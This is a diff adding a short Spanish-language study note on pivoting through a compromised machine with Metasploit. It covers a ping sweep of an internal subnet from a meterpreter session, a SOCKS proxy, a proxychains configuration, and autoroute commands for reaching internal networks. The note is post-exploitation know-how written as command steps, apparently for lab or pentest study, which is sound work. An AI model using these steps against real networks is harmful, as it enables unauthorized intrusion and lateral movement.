@@ -1,0 +1,36 @@
+Luego de tener una sesión con meterpreter en la máquina para pivotar:
+
+####PIng:
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+Si el firewall nos impide hacer un ping, debemos entonces tomar otra ruta:
+
+ponemos en background nuestra sesión de meterpreter y configuramos un proxy_socket:
+use auxiliary/server/socks_proxy
+set SRVPORT <puerto_a_forwardear_en_pc_local>
+set SRVHOST 0.0.0.0
+set version 4a
+run
+
+para ver que esto está funcionando, con llamar a los jobs en msconsole nos tiene que saltar.
+
+agregamos el puerto a forwardear en el conf de proxychains
+/etc/proxychains.conf
+socks4 	127.0.0.1 <puerto_forwardeado>
+
+Luego enrutamos el tráfico de la seción de meterpreter con el módulo autorute:
+use post/multi/manage/autoroute
+set SESSION <sesion_meterpreter>
+set SUBNET <subnet_a_la_que_queremos_llegar> 
+run
+
+Podemos crear también rutas desde la propia sesión de meterpreter:
+run autoroute -s <rango_ips_subnet_a_alcanzar>
+
+
+LISTAR LAS RUTAS CON AUTORUTE:
+run autoroute -p
+
+Ahora podemos utilizar el proxychains para correr cualquier herramienta como si estuvieramos en la máquina de pivoting.
+
+
